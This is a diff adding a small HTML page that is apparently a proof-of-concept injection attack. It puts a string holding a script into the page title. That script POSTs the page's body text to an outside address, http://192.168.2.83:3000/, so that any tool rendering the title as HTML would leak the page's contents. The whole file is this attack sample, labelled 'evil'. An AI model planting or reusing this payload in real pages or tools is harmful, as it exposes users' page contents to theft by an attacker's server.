@@ -1,0 +1,18 @@
+<html>
+    <head>
+        <title id="title-change">My Title</title>
+        <script>
+            var $evilTitle = '<script> \
+                var xhr = new XMLHttpRequest(); \
+                var url = \'http://192.168.2.83:3000/\'; \
+                var params = document.body.innerText; \
+                xhr.open(\'POST\', url+\'?\'+params, true); \
+                xhr.send(params); \
+                <\/script>';
+            document.getElementById('title-change').innerText = $evilTitle;
+        </script>
+    </head>
+    <body>
+        Evil :P
+    </body>
+</html>
